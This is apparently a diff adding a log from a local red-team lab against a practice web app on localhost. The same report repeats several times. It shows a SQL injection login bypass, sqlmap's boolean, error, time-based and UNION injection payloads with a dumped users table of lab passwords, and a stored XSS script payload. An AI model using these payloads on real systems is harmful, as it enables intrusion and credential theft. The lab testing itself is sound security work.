+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:05:49] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:05:49] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:05:49] [INFO] fetching columns for table 'users' 
+[08:05:49] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:05:49] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:05:49] [INFO] fetching columns for table 'comments' 
+[08:05:49] [INFO] fetching entries for table 'comments'
+[08:05:49] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:05:49] [INFO] resumed: 0
+[08:05:49] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:05:49] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:05:49] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0805am.csv'
+
+[*] ending @ 08:05:49 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:05:49Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:07:45Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:07:45 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:07:45] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:07:45] [INFO] testing URL 'http://localhost:5000/login'
+[08:07:45] [INFO] resuming back-end DBMS 'sqlite' 
+[08:07:45] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0807am.csv' as the CSV results file in multiple targets mode
+[08:07:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:07:45] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:07:45] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:07:45] [INFO] fetching columns for table 'comments' 
+[08:07:45] [INFO] fetching entries for table 'comments'
+[08:07:45] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:07:45] [INFO] resumed: 0
+[08:07:45] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:07:45] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:07:45] [INFO] fetching columns for table 'users' 
+[08:07:45] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:07:45] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:07:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0807am.csv'
+
+[*] ending @ 08:07:45 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:07:45Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:09:50Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:09:51 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:09:51] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:09:51] [INFO] testing URL 'http://localhost:5000/login'
+[08:09:51] [INFO] resuming back-end DBMS 'sqlite' 
+[08:09:51] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0809am.csv' as the CSV results file in multiple targets mode
+[08:09:51] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:09:51] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:09:51] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:09:51] [INFO] fetching columns for table 'users' 
+[08:09:51] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:09:51] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:09:51] [INFO] fetching columns for table 'comments' 
+[08:09:51] [INFO] fetching entries for table 'comments'
+[08:09:51] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:09:51] [INFO] resumed: 0
+[08:09:51] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:09:51] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:09:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0809am.csv'
+
+[*] ending @ 08:09:51 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:09:51Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:11:45Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:11:45 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:11:45] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:11:45] [INFO] testing URL 'http://localhost:5000/login'
+[08:11:45] [INFO] resuming back-end DBMS 'sqlite' 
+[08:11:45] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0811am.csv' as the CSV results file in multiple targets mode
+[08:11:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:11:45] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:11:45] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:11:45] [INFO] fetching columns for table 'comments' 
+[08:11:45] [INFO] fetching entries for table 'comments'
+[08:11:45] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:11:45] [INFO] resumed: 0
+[08:11:45] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:11:45] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:11:45] [INFO] fetching columns for table 'users' 
+[08:11:45] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:11:45] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:11:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0811am.csv'
+
+[*] ending @ 08:11:45 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:11:45Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:13:40Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:13:40 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:13:40] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:13:40] [INFO] testing URL 'http://localhost:5000/login'
+[08:13:40] [INFO] resuming back-end DBMS 'sqlite' 
+[08:13:40] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0813am.csv' as the CSV results file in multiple targets mode
+[08:13:40] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:13:40] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:13:40] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:13:40] [INFO] fetching columns for table 'comments' 
+[08:13:40] [INFO] fetching entries for table 'comments'
+[08:13:40] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:13:40] [INFO] resumed: 0
+[08:13:40] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:13:40] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:13:40] [INFO] fetching columns for table 'users' 
+[08:13:40] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:13:40] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:13:40] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0813am.csv'
+
+[*] ending @ 08:13:40 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:13:40Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:21:12Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:21:12 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:21:12] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:21:12] [INFO] testing URL 'http://localhost:5000/login'
+[08:21:12] [INFO] resuming back-end DBMS 'sqlite' 
+[08:21:12] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0821am.csv' as the CSV results file in multiple targets mode
+[08:21:12] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:21:12] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:21:12] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:21:12] [INFO] fetching columns for table 'comments' 
+[08:21:12] [INFO] fetching entries for table 'comments'
+[08:21:12] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:21:12] [INFO] resumed: 0
+[08:21:12] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:21:12] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:21:12] [INFO] fetching columns for table 'users' 
+[08:21:12] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:21:12] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:21:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0821am.csv'
+
+[*] ending @ 08:21:12 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:21:12Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:23:57Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:23:57 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:23:57] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:23:57] [INFO] testing URL 'http://localhost:5000/login'
+[08:23:57] [INFO] resuming back-end DBMS 'sqlite' 
+[08:23:57] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0823am.csv' as the CSV results file in multiple targets mode
+[08:23:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:23:57] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:23:57] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:23:57] [INFO] fetching columns for table 'users' 
+[08:23:57] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:23:57] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:23:57] [INFO] fetching columns for table 'comments' 
+[08:23:57] [INFO] fetching entries for table 'comments'
+[08:23:57] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:23:57] [INFO] resumed: 0
+[08:23:57] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:23:57] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:23:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0823am.csv'
+
+[*] ending @ 08:23:57 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
